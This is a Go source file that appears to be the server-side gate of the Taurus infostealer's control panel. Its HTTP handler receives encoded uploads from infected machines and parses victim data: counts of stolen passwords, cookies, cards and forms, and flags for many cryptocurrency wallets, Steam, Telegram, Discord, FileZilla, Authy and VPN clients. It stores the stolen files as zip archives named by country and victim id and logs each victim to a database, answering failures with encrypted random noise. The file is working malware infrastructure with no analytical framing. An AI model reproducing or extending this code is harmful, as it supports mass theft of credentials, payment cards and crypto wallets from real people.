package gate

import (
	"archive/zip"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	utils "../../utils"
	login "../login"
	logs "../logs"

	"github.com/gin-gonic/gin"
)

type FileData struct {
	Name string
	Data string
}

func ParseFiles(body string) (filesData []FileData) {
	for _, file := range strings.Split(body, "_TAURUS_FILE_NAME_") {
		fileSplitted := strings.Split(file, "_TAURUS_FILE_DATA_")
		if len(fileSplitted) == 2 {
			temp := FileData{
				Name: fileSplitted[0],
				Data: fileSplitted[1],
			}
			filesData = append(filesData, temp)
		}
	}

	return
}

func ParseLogInfo(fileData string) (logData logs.LogsData) {
	if !strings.Contains(fileData, "|") {
		logger.Println("gate.log.ParseLogData error: delimiter not exist")
		return
	}

	logInfo := strings.Split(fileData, "|")
	if len(logInfo) != 39 {
		logger.Println("gate.log.ParseLogData error: exepted 39 args, got " + strconv.Itoa(len(logInfo)))
		return
	}

	logData = logs.LogsData{
		Uid:         logInfo[0],
		Prefix:      logInfo[1],
		WinVer:      logInfo[2],
		Date:        utils.GetTimeStamp(),
		Ip:          logInfo[3],
		Country:     logInfo[4],
		Passwords:   utils.ToInt(logInfo[5]),
		Cookies:     utils.ToInt(logInfo[6]),
		Cards:       utils.ToInt(logInfo[7]),
		Forms:       utils.ToInt(logInfo[8]),
		Domains:     logInfo[9],
		Chromium:    utils.ToBool(logInfo[10]),
		Gecko:       utils.ToBool(logInfo[11]),
		Edge:        utils.ToBool(logInfo[12]),
		Electrum:    utils.ToBool(logInfo[13]),
		MultiBit:    utils.ToBool(logInfo[14]),
		Armory:      utils.ToBool(logInfo[15]),
		Ethereum:    utils.ToBool(logInfo[16]),
		Bytecoin:    utils.ToBool(logInfo[17]),
		Jaxx:        utils.ToBool(logInfo[18]),
		LibertyJaxx: utils.ToBool(logInfo[19]),
		Atomic:      utils.ToBool(logInfo[20]),
		Exodus:      utils.ToBool(logInfo[21]),
		DashCore:    utils.ToBool(logInfo[22]),
		Bitcoin:     utils.ToBool(logInfo[23]),
		Wasabi:      utils.ToBool(logInfo[24]),
		Daedalus:    utils.ToBool(logInfo[25]),
		Monero:      utils.ToBool(logInfo[26]),
		Steam:       utils.ToBool(logInfo[27]),
		Telegram:    utils.ToBool(logInfo[28]),
		Pidgin:      utils.ToBool(logInfo[29]),
		Psi:         utils.ToBool(logInfo[30]),
		PsiPlus:     utils.ToBool(logInfo[31]),
		Discord:     utils.ToBool(logInfo[32]),
		Foxmail:     utils.ToBool(logInfo[33]),
		Outlook:     utils.ToBool(logInfo[34]),
		FileZilla:   utils.ToBool(logInfo[35]),
		WinScp:      utils.ToBool(logInfo[36]),
		Authy:       utils.ToBool(logInfo[37]),
		NordVpn:     utils.ToBool(logInfo[38]),
	}
	return
}

func SaveLog(files []FileData, fileName string) {
	if _, err := os.Stat("./logs/"); os.IsNotExist(err) {
		os.MkdirAll("./logs/", 0777)
	}

	path := filepath.Join("./logs", fileName)
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		os.Remove(path)
	}

	file, err := os.Create(path)
	if err != nil {
		logger.Println("gate.log.SaveLog: create log file error: ", err)
	}
	defer file.Close()

	writer := zip.NewWriter(file)

	for _, file := range files {
		f, err := writer.Create(file.Name)
		if err != nil {
			logger.Println("gate.log.SaveLog: create file in zip error: ", err)
		}
		_, err = f.Write([]byte(file.Data))
		if err != nil {
			logger.Println("gate.log.SaveLog: write file to zip error: ", err)
		}
	}

	err = writer.Close()
	if err != nil {
		logger.Println("gate.log.SaveLog: close zip error: ", err)
	}
}

func LogHandler(ctx *gin.Context) {
	body := ctx.Request.Body
	bodyBytes, err := ioutil.ReadAll(body)
	if err != nil {
		logger.Println("gate.log.Handler: read request body error: ", err)
		ctx.String(http.StatusOK, utils.EncryptData(utils.GenRandStr(rand.Intn(100))))
		return
	}
	defer body.Close()

	fileData := utils.DecodeData(string(bodyBytes))
	files := ParseFiles(fileData)

	var logData logs.LogsData
	for _, file := range files {
		if file.Name == "LogInfo.txt" {
			logData = ParseLogInfo(file.Data)
			break
		}
	}

	if logData.Uid == "" {
		logger.Println("gate.log.Handler: parse loginfo error")
		ctx.String(http.StatusOK, utils.EncryptData(utils.GenRandStr(rand.Intn(100))))
		return
	}

	SaveLog(files, logData.Country+"_"+logData.Uid+".zip")

	_, err = db.Exec("INSERT INTO `logs` (`Uid`, `ForUsers`, `Prefix`, `WinVer`, `Date`, `Ip`, `Country`, `Passwords`, `Cookies`, `Cards`, `Forms`, `Domains`, `Comment`, `Chromium`, `Gecko`, `Edge`, `Electrum`, `MultiBit`, `Armory`, `Ethereum`, `Bytecoin`, `Jaxx`, `LibertyJaxx`, `Atomic`, `Exodus`, `DashCore`, `Bitcoin`, `Wasabi`, `Daedalus`, `Monero`, `Steam`, `Telegram`, `Discord`, `Pidgin`, `Psi`, `PsiPlus`, `Foxmail`, `Outlook`, `FileZilla`, `WinScp`, `Authy`, `NordVpn`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
		logData.Uid,
		login.GetRootUser()+", ",
		logData.Prefix,
		logData.WinVer,
		logData.Date,
		logData.Ip,
		logData.Country,
		logData.Passwords,
		logData.Cookies,
		logData.Cards,
		logData.Forms,
		logData.Domains,
		"",
		logData.Chromium,
		logData.Gecko,
		logData.Edge,
		logData.Electrum,
		logData.MultiBit,
		logData.Armory,
		logData.Ethereum,
		logData.Bytecoin,
		logData.Jaxx,
		logData.LibertyJaxx,
		logData.Atomic,
		logData.Exodus,
		logData.DashCore,
		logData.Bitcoin,
		logData.Wasabi,
		logData.Daedalus,
		logData.Monero,
		logData.Steam,
		logData.Telegram,
		logData.Discord,
		logData.Pidgin,
		logData.Psi,
		logData.PsiPlus,
		logData.Foxmail,
		logData.Outlook,
		logData.FileZilla,
		logData.WinScp,
		logData.Authy,
		logData.NordVpn,
	)

	if err != nil {
		logger.Println("gate.log.Handler: insert info about log into db error: ", err)
		ctx.String(http.StatusOK, utils.EncryptData(utils.GenRandStr(rand.Intn(100))))
		return
	}
	ctx.String(http.StatusOK, utils.EncryptData("OK"))
}
